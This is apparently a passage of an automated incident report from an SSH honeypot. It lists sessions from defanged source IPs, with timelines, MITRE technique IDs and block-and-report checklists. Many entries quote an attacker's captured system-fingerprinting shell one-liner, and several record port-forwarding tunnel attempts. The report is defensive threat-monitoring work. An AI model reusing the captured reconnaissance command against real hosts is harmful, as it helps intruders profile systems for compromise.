- [ ] Block `220.161.52[.]149` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0ccb17b2714

| Field | Detail |
|---|---|
| **Source IP** | `5.11.162[.]163` |
| **First Seen** | 2026-07-24 15:35 |
| **Last Seen** | 2026-07-24 15:35 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:35:22` | `cowrie.session.connect` |
| `2026-07-24 15:35:22` | `cowrie.client.version` |
| `2026-07-24 15:35:22` | `cowrie.client.kex` |
| `2026-07-24 15:35:24` | `cowrie.login.success` |
| `2026-07-24 15:35:24` | `cowrie.direct-tcpip.request` |
| `2026-07-24 15:35:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.11.162[.]163` to AbuseIPDB if not already reported
- [ ] Block `5.11.162[.]163` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e716575ebd25

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 15:35 |
| **Last Seen** | 2026-07-24 15:35 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:35:46` | `cowrie.session.connect` |
| `2026-07-24 15:35:47` | `cowrie.client.version` |
| `2026-07-24 15:35:47` | `cowrie.client.kex` |
| `2026-07-24 15:35:49` | `cowrie.login.success` |
| `2026-07-24 15:35:51` | `cowrie.session.params` |
| `2026-07-24 15:35:51` | `cowrie.command.input` |
| `2026-07-24 15:35:51` | `cowrie.command.input` |
| `2026-07-24 15:35:51` | `cowrie.command.input` |
| `2026-07-24 15:35:51` | `cowrie.command.input` |
| `2026-07-24 15:35:51` | `cowrie.command.input` |
| `2026-07-24 15:35:51` | `cowrie.command.success` |
| `2026-07-24 15:35:51` | `cowrie.command.input` |
| `2026-07-24 15:35:51` | `cowrie.command.input` |
| `2026-07-24 15:35:51` | `cowrie.command.input` |
| `2026-07-24 15:35:51` | `cowrie.command.input` |
| `2026-07-24 15:35:51` | `cowrie.log.closed` |
| `2026-07-24 15:35:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19b2c63a380a

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 15:37 |
| **Last Seen** | 2026-07-24 15:37 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:37:17` | `cowrie.session.connect` |
| `2026-07-24 15:37:18` | `cowrie.client.version` |
| `2026-07-24 15:37:18` | `cowrie.client.kex` |
| `2026-07-24 15:37:20` | `cowrie.login.success` |
| `2026-07-24 15:37:21` | `cowrie.session.params` |
| `2026-07-24 15:37:22` | `cowrie.command.input` |
| `2026-07-24 15:37:22` | `cowrie.command.input` |
| `2026-07-24 15:37:22` | `cowrie.command.input` |
| `2026-07-24 15:37:22` | `cowrie.command.input` |
| `2026-07-24 15:37:22` | `cowrie.command.input` |
| `2026-07-24 15:37:22` | `cowrie.command.success` |
| `2026-07-24 15:37:22` | `cowrie.command.input` |
| `2026-07-24 15:37:22` | `cowrie.command.input` |
| `2026-07-24 15:37:22` | `cowrie.command.input` |
| `2026-07-24 15:37:22` | `cowrie.command.input` |
| `2026-07-24 15:37:22` | `cowrie.log.closed` |
| `2026-07-24 15:37:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c96070e0e53

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 15:38 |
| **Last Seen** | 2026-07-24 15:38 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:38:47` | `cowrie.session.connect` |
| `2026-07-24 15:38:47` | `cowrie.client.version` |
| `2026-07-24 15:38:47` | `cowrie.client.kex` |
| `2026-07-24 15:38:49` | `cowrie.login.success` |
| `2026-07-24 15:38:50` | `cowrie.session.params` |
| `2026-07-24 15:38:50` | `cowrie.command.input` |
| `2026-07-24 15:38:50` | `cowrie.command.input` |
| `2026-07-24 15:38:50` | `cowrie.command.input` |
| `2026-07-24 15:38:50` | `cowrie.command.input` |
| `2026-07-24 15:38:50` | `cowrie.command.input` |
| `2026-07-24 15:38:50` | `cowrie.command.success` |
| `2026-07-24 15:38:50` | `cowrie.command.input` |
| `2026-07-24 15:38:50` | `cowrie.command.input` |
| `2026-07-24 15:38:50` | `cowrie.command.input` |
| `2026-07-24 15:38:50` | `cowrie.command.input` |
| `2026-07-24 15:38:51` | `cowrie.log.closed` |
| `2026-07-24 15:38:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6bc70e46fb58

| Field | Detail |
|---|---|
| **Source IP** | `49.206.201[.]253` |
| **First Seen** | 2026-07-24 15:38 |
| **Last Seen** | 2026-07-24 15:38 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:38:50` | `cowrie.session.connect` |
| `2026-07-24 15:38:50` | `cowrie.client.version` |
| `2026-07-24 15:38:50` | `cowrie.client.kex` |
| `2026-07-24 15:38:52` | `cowrie.login.success` |
| `2026-07-24 15:38:53` | `cowrie.direct-tcpip.request` |
| `2026-07-24 15:38:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.206.201[.]253` to AbuseIPDB if not already reported
- [ ] Block `49.206.201[.]253` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30f586a9a806

| Field | Detail |
|---|---|
| **Source IP** | `59.46.182[.]10` |
| **First Seen** | 2026-07-24 15:38 |
| **Last Seen** | 2026-07-24 15:39 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:38:58` | `cowrie.session.connect` |
| `2026-07-24 15:38:59` | `cowrie.client.version` |
| `2026-07-24 15:38:59` | `cowrie.client.kex` |
| `2026-07-24 15:39:01` | `cowrie.login.success` |
| `2026-07-24 15:39:01` | `cowrie.direct-tcpip.request` |
| `2026-07-24 15:39:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.46.182[.]10` to AbuseIPDB if not already reported
- [ ] Block `59.46.182[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aac65450dc72

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 15:40 |
| **Last Seen** | 2026-07-24 15:40 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:40:14` | `cowrie.session.connect` |
| `2026-07-24 15:40:15` | `cowrie.client.version` |
| `2026-07-24 15:40:15` | `cowrie.client.kex` |
| `2026-07-24 15:40:18` | `cowrie.login.success` |
| `2026-07-24 15:40:20` | `cowrie.session.params` |
| `2026-07-24 15:40:20` | `cowrie.command.input` |
| `2026-07-24 15:40:20` | `cowrie.command.input` |
| `2026-07-24 15:40:20` | `cowrie.command.input` |
| `2026-07-24 15:40:20` | `cowrie.command.input` |
| `2026-07-24 15:40:20` | `cowrie.command.input` |
| `2026-07-24 15:40:20` | `cowrie.command.success` |
| `2026-07-24 15:40:20` | `cowrie.command.input` |
| `2026-07-24 15:40:20` | `cowrie.command.input` |
| `2026-07-24 15:40:20` | `cowrie.command.input` |
| `2026-07-24 15:40:20` | `cowrie.command.input` |
| `2026-07-24 15:40:21` | `cowrie.log.closed` |
| `2026-07-24 15:40:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef31d5fc9f7d

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 15:41 |
| **Last Seen** | 2026-07-24 15:41 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:41:40` | `cowrie.session.connect` |
| `2026-07-24 15:41:41` | `cowrie.client.version` |
| `2026-07-24 15:41:41` | `cowrie.client.kex` |
| `2026-07-24 15:41:44` | `cowrie.login.success` |
| `2026-07-24 15:41:46` | `cowrie.session.params` |
| `2026-07-24 15:41:46` | `cowrie.command.input` |
| `2026-07-24 15:41:46` | `cowrie.command.input` |
| `2026-07-24 15:41:46` | `cowrie.command.input` |
| `2026-07-24 15:41:46` | `cowrie.command.input` |
| `2026-07-24 15:41:46` | `cowrie.command.input` |
| `2026-07-24 15:41:46` | `cowrie.command.success` |
| `2026-07-24 15:41:46` | `cowrie.command.input` |
| `2026-07-24 15:41:46` | `cowrie.command.input` |
| `2026-07-24 15:41:46` | `cowrie.command.input` |
| `2026-07-24 15:41:46` | `cowrie.command.input` |
| `2026-07-24 15:41:47` | `cowrie.log.closed` |
| `2026-07-24 15:41:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea5cbd7a2010

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 15:43 |
| **Last Seen** | 2026-07-24 15:43 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:43:07` | `cowrie.session.connect` |
| `2026-07-24 15:43:08` | `cowrie.client.version` |
| `2026-07-24 15:43:08` | `cowrie.client.kex` |
| `2026-07-24 15:43:11` | `cowrie.login.success` |
| `2026-07-24 15:43:13` | `cowrie.session.params` |
| `2026-07-24 15:43:13` | `cowrie.command.input` |
| `2026-07-24 15:43:13` | `cowrie.command.input` |
| `2026-07-24 15:43:13` | `cowrie.command.input` |
| `2026-07-24 15:43:13` | `cowrie.command.input` |
| `2026-07-24 15:43:13` | `cowrie.command.input` |
| `2026-07-24 15:43:13` | `cowrie.command.success` |
| `2026-07-24 15:43:13` | `cowrie.command.input` |
| `2026-07-24 15:43:13` | `cowrie.command.input` |
| `2026-07-24 15:43:13` | `cowrie.command.input` |
| `2026-07-24 15:43:13` | `cowrie.command.input` |
| `2026-07-24 15:43:14` | `cowrie.log.closed` |
| `2026-07-24 15:43:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-779c4e3f66d6

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 15:44 |
| **Last Seen** | 2026-07-24 15:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:44:34` | `cowrie.session.connect` |
| `2026-07-24 15:44:34` | `cowrie.client.version` |
| `2026-07-24 15:44:34` | `cowrie.client.kex` |
| `2026-07-24 15:44:38` | `cowrie.login.success` |
| `2026-07-24 15:44:40` | `cowrie.session.params` |
| `2026-07-24 15:44:40` | `cowrie.command.input` |
| `2026-07-24 15:44:40` | `cowrie.command.input` |
| `2026-07-24 15:44:40` | `cowrie.command.input` |
| `2026-07-24 15:44:40` | `cowrie.command.input` |
| `2026-07-24 15:44:40` | `cowrie.command.input` |
| `2026-07-24 15:44:40` | `cowrie.command.success` |
| `2026-07-24 15:44:40` | `cowrie.command.input` |
| `2026-07-24 15:44:40` | `cowrie.command.input` |
| `2026-07-24 15:44:40` | `cowrie.command.input` |
| `2026-07-24 15:44:40` | `cowrie.command.input` |
| `2026-07-24 15:44:41` | `cowrie.log.closed` |
| `2026-07-24 15:44:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c240f19047e

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 15:45 |
| **Last Seen** | 2026-07-24 15:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:45:59` | `cowrie.session.connect` |
| `2026-07-24 15:46:00` | `cowrie.client.version` |
| `2026-07-24 15:46:00` | `cowrie.client.kex` |
| `2026-07-24 15:46:03` | `cowrie.login.success` |
| `2026-07-24 15:46:05` | `cowrie.session.params` |
| `2026-07-24 15:46:05` | `cowrie.command.input` |
| `2026-07-24 15:46:05` | `cowrie.command.input` |
| `2026-07-24 15:46:05` | `cowrie.command.input` |
| `2026-07-24 15:46:05` | `cowrie.command.input` |
| `2026-07-24 15:46:05` | `cowrie.command.input` |
| `2026-07-24 15:46:05` | `cowrie.command.success` |
| `2026-07-24 15:46:05` | `cowrie.command.input` |
| `2026-07-24 15:46:05` | `cowrie.command.input` |
| `2026-07-24 15:46:05` | `cowrie.command.input` |
| `2026-07-24 15:46:05` | `cowrie.command.input` |
| `2026-07-24 15:46:06` | `cowrie.log.closed` |
| `2026-07-24 15:46:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45e3491dc70a

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 15:48 |
| **Last Seen** | 2026-07-24 15:48 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:48:51` | `cowrie.session.connect` |
| `2026-07-24 15:48:51` | `cowrie.client.version` |
| `2026-07-24 15:48:51` | `cowrie.client.kex` |
| `2026-07-24 15:48:53` | `cowrie.login.success` |
| `2026-07-24 15:48:55` | `cowrie.session.params` |
| `2026-07-24 15:48:55` | `cowrie.command.input` |
| `2026-07-24 15:48:55` | `cowrie.command.input` |
| `2026-07-24 15:48:55` | `cowrie.command.input` |
| `2026-07-24 15:48:55` | `cowrie.command.input` |
| `2026-07-24 15:48:55` | `cowrie.command.input` |
| `2026-07-24 15:48:55` | `cowrie.command.success` |
| `2026-07-24 15:48:55` | `cowrie.command.input` |
| `2026-07-24 15:48:55` | `cowrie.command.input` |
| `2026-07-24 15:48:55` | `cowrie.command.input` |
| `2026-07-24 15:48:55` | `cowrie.command.input` |
| `2026-07-24 15:48:56` | `cowrie.log.closed` |
| `2026-07-24 15:48:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd7b8b0bfdce

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 15:50 |
| **Last Seen** | 2026-07-24 15:50 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:50:16` | `cowrie.session.connect` |
| `2026-07-24 15:50:16` | `cowrie.client.version` |
| `2026-07-24 15:50:17` | `cowrie.client.kex` |
| `2026-07-24 15:50:19` | `cowrie.login.success` |
| `2026-07-24 15:50:20` | `cowrie.session.params` |
| `2026-07-24 15:50:20` | `cowrie.command.input` |
| `2026-07-24 15:50:20` | `cowrie.command.input` |
| `2026-07-24 15:50:20` | `cowrie.command.input` |
| `2026-07-24 15:50:20` | `cowrie.command.input` |
| `2026-07-24 15:50:20` | `cowrie.command.input` |
| `2026-07-24 15:50:20` | `cowrie.command.success` |
| `2026-07-24 15:50:20` | `cowrie.command.input` |
| `2026-07-24 15:50:20` | `cowrie.command.input` |
| `2026-07-24 15:50:20` | `cowrie.command.input` |
| `2026-07-24 15:50:20` | `cowrie.command.input` |
| `2026-07-24 15:50:21` | `cowrie.log.closed` |
| `2026-07-24 15:50:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5f47708cab5

| Field | Detail |
|---|---|
| **Source IP** | `210.4.68[.]72` |
| **First Seen** | 2026-07-24 15:51 |
| **Last Seen** | 2026-07-24 15:51 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:51:37` | `cowrie.session.connect` |
| `2026-07-24 15:51:38` | `cowrie.client.version` |
| `2026-07-24 15:51:38` | `cowrie.client.kex` |
| `2026-07-24 15:51:40` | `cowrie.login.success` |
| `2026-07-24 15:51:40` | `cowrie.direct-tcpip.request` |
| `2026-07-24 15:51:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.4.68[.]72` to AbuseIPDB if not already reported
- [ ] Block `210.4.68[.]72` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85c011132840

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 15:51 |
| **Last Seen** | 2026-07-24 15:51 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
